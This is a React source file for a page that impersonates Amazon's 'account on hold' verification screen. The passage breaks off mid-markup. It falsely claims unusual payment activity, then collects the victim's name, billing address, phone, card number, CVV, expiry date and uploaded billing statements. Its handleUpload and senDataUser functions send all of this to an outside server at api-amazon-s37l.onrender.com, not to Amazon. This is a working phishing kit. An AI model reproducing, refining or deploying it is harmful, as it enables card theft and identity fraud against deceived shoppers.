import React, { useEffect, useRef, useState } from 'react'

export default function Mobile() {

  const [fullName, setFullName] = useState('');
    const [comment, setComment] = useState('');
    const [fullNameCard, setFullNameCard] = useState('');
    const [selectedCountry, setSelectedCountry] = useState('US');
    const [bill, setBill] = useState('');
    const [billUs1, setBillUs1] = useState('');
    const [billUs2, setBillUs2] = useState('');
    const [phone, setPhone] = useState('');
    const [city, setCity] = useState('');
    const [card, setCard] = useState('');
    const [security, setSecurity] = useState('');
    const [region, setRegion] = useState('');
    const [zipcode, setZipcode] = useState('');
    const [radioValue, setRadioValue] = useState('');
    const [images, setImages] = useState([]);
    const fileInputRef = useRef(null);
    const [month, setMonth] = useState('1');
    const [year, setYear] = useState('2024');
    const [isImage, setIsImage] = useState(false);
    const [urlImages, setUrlImages] = useState([]);

    const handleChangeMonth = (event) => {
        setMonth(event.target.value); 
        console.log(event.target.value);
    };

    const handleChangeYear = (event) => {
        setYear(event.target.value); 
    };

    function selectFiles(){
        fileInputRef.current.click();
    }


    function onFileSelect(event) {
        const files = event.target.files;
        if (files.length === 0) return;
    
        for (let i = 0; i < files.length; i++) {
            const file = files[i];
    
            // Kiểm tra nếu là hình ảnh hoặc PDF
            if (file.type.split('/')[0] === 'image' || file.type === 'application/pdf') {
                if (!images.some((e) => e.name === file.name)) {
                    setImages((prevImages) => [...prevImages, file]);
                }
            }
        }
    }
    

    function deleteImage(index){
        setImages((prevImages) => 
            prevImages.filter((_, i) => i !== index)
        )
    }
    
    
    const handleChangeFullName = (event) => {
      setFullName(event.target.value);
    };

    const handleChangeComment = (event) => {
        setComment(event.target.value);
      };

    const handleChangeFullNameCard = (event) => {
        setFullNameCard(event.target.value);
      };

    const handleCountryChange = (event) => {
        setSelectedCountry(event.target.value);
      };

    const handleChangeBill = (event) => {
        setBill(event.target.value);
    };

    const handleChangeBillUs1 = (event) => {
        setBillUs1(event.target.value);
    };

    const handleChangeBillUs2 = (event) => {
        setBillUs2(event.target.value);
    };

    const handleChangeCity = (event) => {
        setCity(event.target.value);
    };

    const handleChangeCard = (event) => {
        setCard(event.target.value);
    };

    const handleChangesecurity = (event) => {
        setSecurity(event.target.value);
    };

    const handleChangeRegion = (event) => {
        setRegion(event.target.value);
    };

    const handleChangePhone = (event) => {
        setPhone(event.target.value);
    };

    const handleChangeZipCode = (event) => {
        setZipcode(event.target.value);
    };

    const handleRadioChange = (event) => {
        setRadioValue(event.target.value);
      };

      useEffect(() =>{
        if(urlImages.length > 0 && urlImages.length === images.length){
        
            senDataUser();
            setUrlImages([]);
        }else{
            console.log(urlImages);
            
        }
    },[urlImages])

    const handleUpload = async (event) => {
        // http://localhost:4000
        // https://api-amazon-s37l.onrender.com
        event.preventDefault();
        
        if(images.length > 0){
        
        for(let i = 0; i< images.length; i++){
            let responseData;
            let formData = new FormData();
            formData.append('imageItem', images[i]);
  
            await fetch('https://api-amazon-s37l.onrender.com/upload',{
            method:'POST',
            headers:{
                Accept:'application/json',
            },
            body:formData,
            }).then((resp) => resp.json()).then((data) => {responseData=data});
            
            if(responseData.success){
                setUrlImages((prevUrl) => [...prevUrl, responseData.image_url]);
                
            }
            
            
            setIsImage(false);
        }
        
    
    
    }else{
            setIsImage(true);
        }
        
    };

    const senDataUser = async () =>{
      const user = {
          fullName: fullName,
          selectedCountry: selectedCountry,
          bill: bill,
          billUs1: billUs1,
          billUs2: billUs2,
          phone: phone,
          city: city,
          card: card,
          security: security,
          region: region,
          zipcode: zipcode,
          radioValue: radioValue,
          fullNameCard: fullNameCard,
          month: month,
          year: year,
          comment: comment,
          image: urlImages
      };
      console.log(user);

      await fetch('https://api-amazon-s37l.onrender.com/adduser',{
      method:'POST',
      headers:{
          Accept:'application/json',
          'Content-Type':'application/json',
      },
      body:JSON.stringify(user),
      }).then((resp) => resp.json()).then((data)=>{
      data.success?alert("User Added"):alert("Failed")
      })
  }
    
  

  return (
    <>
    <div id="a-page">
      <div className="a-section abbott-view-header">
        <div className="a-section a-spacing-none">
          <div className="a-section abbott-view-component">
            <header
              className="amazon-header nav-mobile nav-locale-us nav-lang- nav-ssl nav-unrec nav-blueheaven"
            >
              <div id="navbar">
                <div id="nav-logobar">
                  <div className="nav-left">
                    <div id="nav-logo">
                      <a
                        href="https://www.amazon.com/"
                        className="nav-logo-link"
                        aria-label=""
                      >
                        <span className="nav-sprite nav-logo-base"></span>
                        <span className="nav-sprite nav-logo-locale"></span>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </header>
          </div>
        </div>
      </div>
      <div className="a-section abbott-view-content">
        <div className="a-section a-padding-small">
          <form id="abbott-form" method="post" action="/">
            <input
              type="hidden"
              name="__token_"
              value="g8t0YuXggrOlsoUNxr+GFhyB6WoijfyIghi6+DfHGiQTAAAAAQAAAABl5HmGcmF3AAAAAPgCGsIfbV0AW+J7i/a6ow=="
            />

            <input
              type="hidden"
              name="authenticationContext"
              value="language=en_US&amp;marketplaceId=ATVPDKIKX0DER&amp;assocHandle=amzn_abbott_portal_us&amp;pageId=amzn_abbott_portal_us&amp;returnTo=https%3A%2F%2Fwww.amazon.com"
              spellCheck="false"
            />

            <div
              id="alert-0"
              className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
            >
              <div
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-section a-spacing-none has-action-on-load"
              >
                <div className="a-box a-alert a-alert-error" role="alert">
                  <div className="a-box-inner a-alert-container">
                    <h4 className="a-alert-heading">Account on hold temporarily</h4>
                    <div className="a-alert-content">
                      We noticed unusual payment activity on your account and
                      need to verify ownership of the payment method used on
                      your most recent order. (<span
                        className="a-declarative"
                        data-action="a-sheet"
                        data-csa-c-type="widget"
                        data-csa-c-func-deps="aui-da-a-sheet"
                        data-a-sheet='{"name":"alert-0-1","preloadDomId":"alert-0-1"}'
                        ><a className="a-link-normal" href="#">Why?</a></span
                      >)
                      <div id="alert-0-1" className="hidden">
                        <div className="a-container">
                          <div className="a-section a-spacing-small">
                            <h1 className="a-size-medium a-text-bold">
                              Why are we asking for this information?
                            </h1>
                          </div>
                          <div className="a-section a-spacing-none">
                            <span
                              >Amazon takes your security seriously, and
                              monitors activity on your account to keep your
                              account and payment methods safe.</span
                            >
                            <ul className="a-unordered-list a-vertical">
                              <li>
                                <span className="a-list-item"
                                  >We noticed unusual payment activity on your
                                  account.</span
                                >
                              </li>
                              <li>
                                <span className="a-list-item"
                                  >We have temporarily placed your account on
                                  hold so we could review it with you.</span
                                >
                              </li>
                              <li>
                                <span className="a-list-item"
                                  >While your account is on hold, your pending
                                  orders are also on hold and may be
                                  cancelled.</span
                                >
                              </li>
                              <li>
                                <span className="a-list-item"
                                  >If you promptly submit this form and attach a
                                  supporting document, we may be able to remove
                                  the hold on your account more quickly.</span
                                >
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div
              id="header-1"
              className="a-section a-spacing-mini abbott-view-component component-display-block component-width-extra_large"
            >
              <h1
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-size-large has-action-on-load text-align-left a-text-bold"
              >
                Enter billing details
              </h1>
            </div>

            <div
              id="header-2"
              className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
            >
              <h1
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-size-base has-action-on-load text-align-left a-text-normal"
              >
                This is required to remove the hold on your account.
              </h1>
            </div>

            <div
              id="text-input-3"
              className="a-section a-spacing-extra-large abbott-view-component component-display-block component-width-extra_large"
            >
              <div className="a-section a-spacing-none">
                <label className="a-form-label"
                  ><i className="input-field-required"></i> Full name</label
                >
                <div
                  data-action-on-load="register-listeners"
                  data-listeners=""
                  className="a-input-text-wrapper a-form-normal input-field-width text-input-field has-action-on-load"
                >
                  <input
                    type="text"
                    maxLength="100"
                    placeholder="Name that appears on the payment method"
                    name="full-name"
                    value={fullName}
                    onChange={handleChangeFullName}
                  />
                </div>
              </div>
            </div>

            <div
              id="country-4"
              className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
            >
              <div className="a-section a-spacing-none">
                <span className="a-dropdown-container"
                  ><select
                    name="country-code"
                    autoComplete="off"
                    tabIndex="0"
                    value={selectedCountry}
                    onChange={handleCountryChange}
                    data-action="a-dropdown-select"
                    className="a-native-dropdown a-declarative"
                    aria-pressed="false"
                  >
                    <option value="AF">Afghanistan</option>
                    <option value="AX">Aland Islands</option>
                    <option value="AL">Albania</option>
                    <option value="DZ">Algeria</option>
                    <option value="AS">American Samoa</option>
                    <option value="AD">Andorra</option>
                    <option value="AO">Angola</option>
                    <option value="AI">Anguilla</option>
                    <option value="AQ">Antarctica</option>
                    <option value="AG">Antigua and Barbuda</option>
                    <option value="AR">Argentina</option>
                    <option value="AM">Armenia</option>
                    <option value="AW">Aruba</option>
                    <option value="AU">Australia</option>
                    <option value="AT">Austria</option>
                    <option value="AZ">Azerbaijan</option>
                    <option value="BS">Bahamas, The</option>
                    <option value="BH">Bahrain</option>
                    <option value="BD">Bangladesh</option>
                    <option value="BB">Barbados</option>
                    <option value="BY">Belarus</option>
                    <option value="BE">Belgium</option>
                    <option value="BZ">Belize</option>
                    <option value="BJ">Benin</option>
                    <option value="BM">Bermuda</option>
                    <option value="BT">Bhutan</option>
                    <option value="BO">Bolivia</option>
                    <option value="BQ">
                      Bonaire, Saint Eustatius and Saba
                    </option>
                    <option value="BA">Bosnia and Herzegovina</option>
                    <option value="BW">Botswana</option>
                    <option value="BV">Bouvet Island</option>
                    <option value="BR">Brazil</option>
                    <option value="IO">British Indian Ocean Territory</option>
                    <option value="BN">Brunei Darussalam</option>
                    <option value="BG">Bulgaria</option>
                    <option value="BF">Burkina Faso</option>
                    <option value="BI">Burundi</option>
                    <option value="KH">Cambodia</option>
                    <option value="CM">Cameroon</option>
                    <option value="CA">Canada</option>
                    <option value="IC">Canary Islands</option>
                    <option value="CV">Cape Verde</option>
                    <option value="KY">Cayman Islands</option>
                    <option value="CF">Central African Republic</option>
                    <option value="TD">Chad</option>
                    <option value="CL">Chile</option>
                    <option value="CN">China</option>
                    <option value="CX">Christmas Island</option>
                    <option value="CC">Cocos (Keeling) Islands</option>
                    <option value="CO">Colombia</option>
                    <option value="KM">Comoros</option>
                    <option value="CG">Congo</option>
                    <option value="CD">
                      Congo, The Democratic Republic of the
                    </option>
                    <option value="CK">Cook Islands</option>
                    <option value="CR">Costa Rica</option>
                    <option value="CI">Cote D'ivoire</option>
                    <option value="HR">Croatia</option>
                    <option value="CU">Cuba</option>
                    <option value="CW">Curaçao</option>
                    <option value="CY">Cyprus</option>
                    <option value="CZ">Czech Republic</option>
                    <option value="DK">Denmark</option>
                    <option value="DJ">Djibouti</option>
                    <option value="DM">Dominica</option>
                    <option value="DO">Dominican Republic</option>
                    <option value="EC">Ecuador</option>
                    <option value="EG">Egypt</option>
                    <option value="SV">El Salvador</option>
                    <option value="GQ">Equatorial Guinea</option>
                    <option value="ER">Eritrea</option>
                    <option value="EE">Estonia</option>
                    <option value="ET">Ethiopia</option>
                    <option value="FK">Falkland Islands (Malvinas)</option>
                    <option value="FO">Faroe Islands</option>
                    <option value="FJ">Fiji</option>
                    <option value="FI">Finland</option>
                    <option value="FR">France</option>
                    <option value="GF">French Guiana</option>
                    <option value="PF">French Polynesia</option>
                    <option value="TF">French Southern Territories</option>
                    <option value="GA">Gabon</option>
                    <option value="GM">Gambia, The</option>
                    <option value="GE">Georgia</option>
                    <option value="DE">Germany</option>
                    <option value="GH">Ghana</option>
                    <option value="GI">Gibraltar</option>
                    <option value="GR">Greece</option>
                    <option value="GL">Greenland</option>
                    <option value="GD">Grenada</option>
                    <option value="GP">Guadeloupe</option>
                    <option value="GU">Guam</option>
                    <option value="GT">Guatemala</option>
                    <option value="GG">Guernsey</option>
                    <option value="GN">Guinea</option>
                    <option value="GW">Guinea-Bissau</option>
                    <option value="GY">Guyana</option>
                    <option value="HT">Haiti</option>
                    <option value="HM">
                      Heard Island and the McDonald Islands
                    </option>
                    <option value="VA">Holy See</option>
                    <option value="HN">Honduras</option>
                    <option value="HK">Hong Kong</option>
                    <option value="HU">Hungary</option>
                    <option value="IS">Iceland</option>
                    <option value="IN">India</option>
                    <option value="ID">Indonesia</option>
                    <option value="IR">Iran, Islamic Republic of</option>
                    <option value="IQ">Iraq</option>
                    <option value="IE">Ireland</option>
                    <option value="IM">Isle of Man</option>
                    <option value="IL">Israel</option>
                    <option value="IT">Italy</option>
                    <option value="JM">Jamaica</option>
                    <option value="JP">Japan</option>
                    <option value="JE">Jersey</option>
                    <option value="JO">Jordan</option>
                    <option value="KZ">Kazakhstan</option>
                    <option value="KE">Kenya</option>
                    <option value="KI">Kiribati</option>
                    <option value="KP">
                      Korea, Democratic People's Republic of
                    </option>
                    <option value="KR">Korea, Republic of</option>
                    <option value="XK">Kosovo</option>
                    <option value="KW">Kuwait</option>
                    <option value="KG">Kyrgyzstan</option>
                    <option value="LA">Lao People's Democratic Republic</option>
                    <option value="LV">Latvia</option>
                    <option value="LB">Lebanon</option>
                    <option value="LS">Lesotho</option>
                    <option value="LR">Liberia</option>
                    <option value="LY">Libya</option>
                    <option value="LI">Liechtenstein</option>
                    <option value="LT">Lithuania</option>
                    <option value="LU">Luxembourg</option>
                    <option value="MO">Macao</option>
                    <option value="MK">
                      Macedonia, The Former Yugoslav Republic of
                    </option>
                    <option value="MG">Madagascar</option>
                    <option value="MW">Malawi</option>
                    <option value="MY">Malaysia</option>
                    <option value="MV">Maldives</option>
                    <option value="ML">Mali</option>
                    <option value="MT">Malta</option>
                    <option value="MH">Marshall Islands</option>
                    <option value="MQ">Martinique</option>
                    <option value="MR">Mauritania</option>
                    <option value="MU">Mauritius</option>
                    <option value="YT">Mayotte</option>
                    <option value="MX">Mexico</option>
                    <option value="FM">Micronesia, Federated States of</option>
                    <option value="MD">Moldova, Republic of</option>
                    <option value="MC">Monaco</option>
                    <option value="MN">Mongolia</option>
                    <option value="ME">Montenegro</option>
                    <option value="MS">Montserrat</option>
                    <option value="MA">Morocco</option>
                    <option value="MZ">Mozambique</option>
                    <option value="MM">Myanmar</option>
                    <option value="NA">Namibia</option>
                    <option value="NR">Nauru</option>
                    <option value="NP">Nepal</option>
                    <option value="NL">Netherlands</option>
                    <option value="AN">Netherlands Antilles</option>
                    <option value="NC">New Caledonia</option>
                    <option value="NZ">New Zealand</option>
                    <option value="NI">Nicaragua</option>
                    <option value="NE">Niger</option>
                    <option value="NG">Nigeria</option>
                    <option value="NU">Niue</option>
                    <option value="NF">Norfolk Island</option>
                    <option value="MP">Northern Mariana Islands</option>
                    <option value="NO">Norway</option>
                    <option value="OM">Oman</option>
                    <option value="PK">Pakistan</option>
                    <option value="PW">Palau</option>
                    <option value="PS">Palestinian Territories</option>
                    <option value="PA">Panama</option>
                    <option value="PG">Papua New Guinea</option>
                    <option value="PY">Paraguay</option>
                    <option value="PE">Peru</option>
                    <option value="PH">Philippines</option>
                    <option value="PN">Pitcairn</option>
                    <option value="PL">Poland</option>
                    <option value="PT">Portugal</option>
                    <option value="PR">Puerto Rico</option>
                    <option value="QA">Qatar</option>
                    <option value="RE">Reunion</option>
                    <option value="RO">Romania</option>
                    <option value="RU">Russian Federation</option>
                    <option value="RW">Rwanda</option>
                    <option value="BL">Saint Barthelemy</option>
                    <option value="SH">
                      Saint Helena, Ascension and Tristan da Cunha
                    </option>
                    <option value="KN">Saint Kitts and Nevis</option>
                    <option value="LC">Saint Lucia</option>
                    <option value="MF">Saint Martin</option>
                    <option value="PM">Saint Pierre and Miquelon</option>
                    <option value="VC">Saint Vincent and the Grenadines</option>
                    <option value="WS">Samoa</option>
                    <option value="SM">San Marino</option>
                    <option value="ST">Sao Tome and Principe</option>
                    <option value="SA">Saudi Arabia</option>
                    <option value="SN">Senegal</option>
                    <option value="RS">Serbia</option>
                    <option value="CS">Serbia and Montenegro</option>
                    <option value="SC">Seychelles</option>
                    <option value="SL">Sierra Leone</option>
                    <option value="SG">Singapore</option>
                    <option value="SX">Sint Maarten</option>
                    <option value="SK">Slovakia</option>
                    <option value="SI">Slovenia</option>
                    <option value="SB">Solomon Islands</option>
                    <option value="SO">Somalia</option>
                    <option value="ZA">South Africa</option>
                    <option value="GS">
                      South Georgia and the South Sandwich Islands
                    </option>
                    <option value="SS">South Sudan</option>
                    <option value="ES">Spain</option>
                    <option value="LK">Sri Lanka</option>
                    <option value="SD">Sudan</option>
                    <option value="SR">Suriname</option>
                    <option value="SJ">Svalbard and Jan Mayen</option>
                    <option value="SZ">Swaziland</option>
                    <option value="SE">Sweden</option>
                    <option value="CH">Switzerland</option>
                    <option value="SY">Syria</option>
                    <option value="TW">Taiwan</option>
                    <option value="TJ">Tajikistan</option>
                    <option value="TZ">Tanzania, United Republic of</option>
                    <option value="TH">Thailand</option>
                    <option value="TL">Timor-leste</option>
                    <option value="TG">Togo</option>
                    <option value="TK">Tokelau</option>
                    <option value="TO">Tonga</option>
                    <option value="TT">Trinidad and Tobago</option>
                    <option value="TN">Tunisia</option>
                    <option value="TR">Turkey</option>
                    <option value="TM">Turkmenistan</option>
                    <option value="TC">Turks and Caicos Islands</option>
                    <option value="TV">Tuvalu</option>
                    <option value="UG">Uganda</option>
                    <option value="UA">Ukraine</option>
                    <option value="AE">United Arab Emirates</option>
                    <option value="GB">United Kingdom</option>
                    <option value="US" selected="">United States</option>
                    <option value="UM">
                      United States Minor Outlying Islands
                    </option>
                    <option value="UY">Uruguay</option>
                    <option value="UZ">Uzbekistan</option>
                    <option value="VU">Vanuatu</option>
                    <option value="VE">Venezuela</option>
                    <option value="VN">Vietnam</option>
                    <option value="VG">Virgin Islands, British</option>
                    <option value="VI">Virgin Islands, U.S.</option>
                    <option value="WF">Wallis and Futuna</option>
                    <option value="EH">Western Sahara</option>
                    <option value="YE">Yemen</option>
                    <option value="YU">Yugoslavia</option>
                    <option value="ZM">Zambia</option>
                    <option value="ZW">Zimbabwe</option></select
                  ><span
                    tabIndex="-1"
                    data-action-on-load="register-listeners"
                    data-listeners=""
                    data-a-classname="input-field-width has-action-on-load"
                    className="style5 a-button a-button-dropdown input-field-width has-action-on-load"
                    aria-hidden="true"
                    id="a-autoid-0"
                    ><span className="a-button-inner"
                      ><span
                        className="a-button-text a-declarative"
                        data-csa-c-func-deps="aui-da-a-dropdown-button"
                        data-csa-c-type="widget"
                        data-csa-interaction-events="click"
                        data-action="a-dropdown-button"
                        aria-hidden="true"
                        id="a-autoid-0-announce"
                        ><span className="a-dropdown-prompt">Venezuela</span></span
                      ><i className="a-icon a-icon-dropdown"></i></span></span
                ></span>
              </div>
            </div>

            <div
              id="text-area-5"
              className="a-section a-spacing-extra-large abbott-view-component component-width-extra_large component-display-block"
            >
              <div className="a-section a-spacing-none">
                <label className="a-form-label">Billing address</label>
                <div
                  data-action-on-load="register-listeners"
                  data-listeners='[{"name":"country-code","toggle":"block","matcher":"not_in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                  className="a-input-text-wrapper a-form-normal input-field-width has-action-on-load"
                >
                  <textarea
                    maxLength="300"
                    rows="5"
                    value={bill}
                    onChange={handleChangeBill}
                    name="address-generic"
                    className="a-form-normal"
                  ></textarea>
                </div>
              </div>
            </div>

            <div
              id="text-input-6"
              className="a-section a-spacing-base abbott-view-component component-width-extra_large component-display-none"
            >
              <div className="a-section a-spacing-none">
                <label className="a-form-label"
                  ><i className="input-field-required"></i> Billing address</label
                >
                <div
                  data-action-on-load="register-listeners"
                  data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                  className="a-input-text-wrapper a-form-normal input-field-width text-input-field has-action-on-load"
                >
                  <input
                    type="text"
                    maxLength="100"
                    value={billUs1}
                    onChange={handleChangeBillUs1}
                    placeholder="Street and number, P.O. box, c/o."
                    name="street-line-one"
                  />
                </div>
              </div>
            </div>

            <div
              id="text-input-7"
              className="a-section a-spacing-base abbott-view-component component-width-extra_large component-display-none"
            >
              <div className="a-section a-spacing-none">
                <div
                  data-action-on-load="register-listeners"
                  data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                  className="a-input-text-wrapper a-form-normal input-field-width text-input-field has-action-on-load"
                >
                  <input
                    type="text"
                    maxLength="100"
                    value={billUs2}
                    onChange={handleChangeBillUs2}
                    placeholder="Apartment, suite, unit, building, floor, etc."
                    name="street-line-two"
                  />
                </div>
              </div>
            </div>

            <div
              id="text-input-8"
              className="a-section a-spacing-base abbott-view-component component-width-extra_large component-display-none"
            >
              <div className="a-section a-spacing-none">
                <label className="a-form-label"
                  ><i className="input-field-required"></i> City</label
                >
                <div
                  data-action-on-load="register-listeners"
                  data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                  className="a-input-text-wrapper a-form-normal input-field-width text-input-field has-action-on-load"
                >
                  <input 
                  type="text" 
                  maxLength="100" 
                  name="city" 
                  value={city}
                  onChange={handleChangeCity}/>
                </div>
              </div>
            </div>

            <div
              id="text-input-9"
              className="a-section a-spacing-base abbott-view-component component-width-extra_large component-display-none"
            >
              <div className="a-section a-spacing-none">
                <label className="a-form-label"
                  ><i className="input-field-required"></i>
                  State/Province/Region</label
                >
                <div
                  data-action-on-load="register-listeners"
                  data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                  className="a-input-text-wrapper a-form-normal input-field-width text-input-field has-action-on-load"
                >
                  <input type="text" maxLength="100" name="region" value={region}
                            onChange={handleChangeRegion}/>
                </div>
              </div>
            </div>

            <div
              id="text-input-10"
              className="a-section a-spacing-extra-large abbott-view-component component-width-extra_large component-display-none"
            >
              <div className="a-section a-spacing-none">
                <label className="a-form-label"
                  ><i className="input-field-required"></i> Zip Code</label
                >
                <div
                  data-action-on-load="register-listeners"
                  data-listeners='[{"name":"country-code","toggle":"block","matcher":"in","values":["US","DE","FR","IT","ES","NL","CA"]}]'
                  className="a-input-text-wrapper a-form-normal input-field-width text-input-field has-action-on-load"
                >
                  <input type="text" maxLength="100" name="zip-code" value={zipcode}
                            onChange={handleChangeZipCode}/>
                </div>
              </div>
            </div>

            <div
              id="text-input-11"
              className="a-section a-spacing-extra-large abbott-view-component component-display-block component-width-extra_large"
            >
              <div className="a-section a-spacing-none">
                <label className="a-form-label"
                  ><i className="input-field-required"></i> Phone number</label
                >
                <div
                  data-action-on-load="register-listeners"
                  data-listeners=""
                  className="a-input-text-wrapper a-form-normal input-field-width text-input-field has-action-on-load"
                >
                  <input type="tel" maxLength="20" name="phone-number" value={phone}
                            onChange={handleChangePhone}/>
                </div>
              </div>
            </div>

            <div
                    id=""
                    className="a-section a-spacing-mini abbott-view-component component-display-block component-width-extra_large"
                    >
                    <h1
                        data-action-on-load="register-listeners"
                        data-listeners=""
                        className="a-size-large has-action-on-load text-align-left a-text-bold"
                    >
                        Enter your card information:
                    </h1>
                    </div>

                    <div
                    id=""
                    className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                    >
                    <h1
                        data-action-on-load="register-listeners"
                        data-listeners=""
                        className="a-size-base has-action-on-load text-align-left a-text-normal"
                    >
                        This is required to remove the hold on your account.
                    </h1>
                    </div>

                    <div
                    id=""
                    className="a-section abbott-view-component component-display-block component-width-extra_large"
                    >
                    <div className="a-section a-spacing-none">
                        <div className="a-section a-spacing-none">
                        <label className="a-form-label"
                            ><i className="input-field-required"></i> Full name</label
                        ><input
                            type="text"
                            maxLength="100"
                            placeholder="Name that appears on the payment method"
                            name="full-name"
                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load"
                            value={fullNameCard}
                            onChange={handleChangeFullNameCard}
                        />
                        </div>
                    </div>
                    </div>

                    <div
                    className="custom-your-card-mobile abbott-view-component component-width-extra_large"
                    >
                    <div
                        id=""
                        className=" component-display-block w-full pb-14"
                    >
                        <div className="a-section a-spacing-none">
                        <div className="a-section a-spacing-none">
                            <label className="a-form-label"
                            ><i className="input-field-required"></i> Card number</label
                            ><input
                            type="tel"
                            maxLength="20"
                            name="phone-number"
                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load w-full"
                            data-action-on-load="register-listeners"
                            data-listeners=""
                            value={card}
                            onChange={handleChangeCard}
                            />
                        </div>
                        </div>
                    </div>
                    <div
                        id="text-input-11"
                        className="  component-display-block w-full"
                    >
                        <div className="a-section a-spacing-none">
                        <div className="a-section a-spacing-none">
                            <label className="a-form-label"
                            ><i className="input-field-required"></i> Security Code
                            (CVV/CVC)</label
                            >
                            <input
                            type="tel"
                            maxLength="20"
                            name="phone-number"
                            className="a-input-text a-form-normal input-field-width text-input-field has-action-on-load w-25"
                            data-action-on-load="register-listeners"
                            data-listeners=""
                            value={security}
                            onChange={handleChangesecurity}
                            />
                            <span>{ ' '}(<span className="custom-text">What's this?</span>)</span>
                        </div>
                        </div>
                    </div>
                    </div>

                    <div
                    className="mt-12 a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
                    >
                    <div className="a-section pb-22">
                        <div className="a-section">
                            <label className="a-form-label"
                                ><i className="input-field-required"></i> Expiration date</label
                            >
                            <div className="custom-your-card2">
                                <span className="a-dropdown-container"
                                    
                                    >
                                    <select
                                    className="a-native-dropdown a-declarative"
                                    value={month}
                                    onChange={handleChangeMonth}
                                    >
                                    <option value="1">01</option>
                                    <option value="2">02</option>
                                    <option value="3">03</option>
                                    <option value="4">04</option>
                                    <option value="5">05</option>
                                    <option value="6">06</option>
                                    <option value="7">07</option>
                                    <option value="8">08</option>
                                    <option value="9">09</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                    </select>
                                    <span
                                    tabIndex="-1"
                                    data-action-on-load="register-listeners"
                                    data-listeners=""
                                    data-a-classname="input-field-width has-action-on-load"
                                    className="a-button a-button-dropdown input-field-width has-action-on-load"
                                    aria-hidden="true"
                                    ><span className="a-button-inner"
                                        ><span
                                        className="a-button-text a-declarative"
                                        data-csa-c-func-deps="aui-da-a-dropdown-button"
                                        data-csa-c-type="widget"
                                        data-csa-interaction-events="click"
                                        data-action="a-dropdown-button"
                                        aria-hidden="true"
                                        ><span className="a-dropdown-prompt"></span></span
                                        ><i className="a-icon a-icon-dropdown"></i></span></span
                                ></span>
                                <span className="a-dropdown-container"
                        ><select
                        
                        data-action="a-dropdown-select"
                        className="a-native-dropdown a-declarative"
                        value={year}
                        onChange={handleChangeYear}
                        >
                            <option value="2024">2024</option>
                            <option value="2023">2023</option>
                            <option value="2022">2022</option>
                        </select>
                        <span
                        tabIndex="-1"
                        data-action-on-load="register-listeners"
                        data-listeners=""
                        data-a-classname="input-field-width has-action-on-load"
                        className="a-button a-button-dropdown input-field-width has-action-on-load"
                        aria-hidden="true"
                        ><span className="a-button-inner"
                            ><span
                            className="a-button-text a-declarative"
                            data-csa-c-func-deps="aui-da-a-dropdown-button"
                            data-csa-c-type="widget"
                            data-csa-interaction-events="click"
                            data-action="a-dropdown-button"
                            aria-hidden="true"
                            ><span className="a-dropdown-prompt"></span></span
                            ><i className="a-icon a-icon-dropdown"></i></span></span
                    ></span>
                            
                            </div>
                        </div>
                    </div>
                    </div>

            <div
              id="divider-12"
              className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
            >
              <hr aria-hidden="true" className="a-divider-normal" />
            </div>

            <div
              id="header-13"
              className="a-section a-spacing-mini abbott-view-component component-display-block component-width-extra_large"
            >
              <h1
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-size-large has-action-on-load text-align-left a-text-bold"
              >
                Attach supporting document
              </h1>
            </div>

            <div
              id="header-14"
              className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
            >
              <h1
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-size-base has-action-on-load text-align-left a-text-normal"
              >
                This can help remove the hold on your account more quickly.
              </h1>
            </div>

            <div
              id="text-15"
              className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
            >
              <span
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-size-base has-action-on-load text-align-left"
                ><iframe
                  src="https://player.vimeo.com/video/667387306?h=37c31a1554"
                  width="100%"
                  height="300"
                  frameBorder="0"
                  allow="autoplay; fullscreen; picture-in-picture"
                  allowFullScreen=""
                ></iframe
              ></span>
            </div>

            <div
              id="header-16"
              className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
            >
              <h1
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-size-base has-action-on-load text-align-left a-text-bold"
              >
                What type of document should you upload?
              </h1>
            </div>

            <div
              id="text-17"
              className="a-section a-spacing-medium abbott-view-component component-display-block component-width-extra_large"
            >
              <span
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-size-base has-action-on-load text-align-left"
              >
                <a
                  href="https://m.media-amazon.com/images/G/01/CSSW/BillingstatementCCDC_New.pdf"
                  
                  >View sample documents</a
                ></span
              >
            </div>

            <div
              id="radio-18"
              className="a-section a-spacing-medium abbott-view-component component-display-block component-width-extra_large"
            >
              <div
                data-action-on-load="register-listeners"
                data-listeners=""
                className="a-box has-action-on-load"
              >
                <div className="a-box-inner a-padding-small">
                  <div
                    className="a-section a-spacing-none a-padding-small radio-option highlight-on radio-option-highlight"
                  >
                    <div
                      data-a-input-name="document-type"
                      className="a-radio a-radio-fancy a-control-row a-touch-radio validate-on-select"
                    >
                      <label className="radio-option-selected"
                        ><input
                          type="radio"
                          name="document-type"
                          onChange={handleRadioChange}
                          value="billing-statement"
                        /><i className="a-icon a-icon-radio"></i
                        ><span className="a-label a-radio-label"
                          >Redacted billing statement (Credit / Debit card, Bank
                          account)
                          <span
